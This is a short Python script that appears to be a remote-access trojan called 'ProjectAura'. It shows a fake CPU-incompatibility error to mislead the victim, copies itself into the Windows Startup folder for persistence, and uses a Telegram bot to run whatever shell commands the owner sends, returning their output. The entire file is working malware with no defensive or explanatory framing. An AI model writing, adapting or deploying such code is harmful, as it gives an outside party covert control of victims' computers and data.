import os
import shutil
import sys
import pyrogram
import pymsgbox
import subprocess

bot_token = ""
api_id = 0
api_hash = ""
owner = 0

pymsgbox.alert(text="This app is not compatible with your CPU", title="Error!", button="OK")

app = pyrogram.Client(bot_token=bot_token, name="ProjectAura", api_id=api_id, api_hash=api_hash, in_memory=True)

if os.path.basename(os.getcwd()) != "Startup":
    autostart_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shutil.copy(src=sys.argv[0], dst=autostart_dir)

@app.on_message(filters=pyrogram.filters.user(users=owner))
def run(_, message):
    try:
        output = subprocess.getoutput(cmd=message.text)
        message.reply(output)
    except Exception as e:
        message.reply(str(e))

@app.on_message(filters=pyrogram.filters.command(commands="abort") & pyrogram.filters.user(users=owner))
def abort(_, __):
    quit()

app.run()
